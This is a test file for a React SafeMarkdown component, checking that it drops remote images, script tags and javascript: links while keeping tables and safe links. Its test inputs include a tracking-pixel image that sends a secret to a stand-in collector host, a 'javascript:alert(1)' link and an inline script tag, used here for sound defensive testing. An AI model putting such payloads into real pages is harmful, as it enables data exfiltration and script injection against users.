import { render, screen } from '@testing-library/react'
import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import SafeMarkdown from './SafeMarkdown'

describe('SafeMarkdown', () => {
  it('does not create remote image elements or React image preloads', () => {
    const html = renderToStaticMarkup(<SafeMarkdown>{'![论文图片](https://collector.example/pixel?secret=sample)\n\n<img src="https://collector.example/raw">'}</SafeMarkdown>)
    expect(html).toContain('论文图片')
    expect(html).not.toMatch(/<img|preload|collector\.example/)
  })
  it('retains tables and safe explicit links without active HTML', () => {
    const { container } = render(<SafeMarkdown>{'|项目|值|\n|---|---|\n|样品|3|\n\n[原文](https://example.org/paper)\n\n[bad](javascript:alert(1))\n\n<script>alert(1)</script>'}</SafeMarkdown>)
    expect(screen.getByRole('table')).toBeInTheDocument()
    expect(screen.getByRole('link', { name: '原文' })).toHaveAttribute('rel', 'noopener noreferrer')
    expect(screen.queryByRole('link', { name: 'bad' })).toBeNull()
    expect(container.querySelector('script')).toBeNull()
  })
})
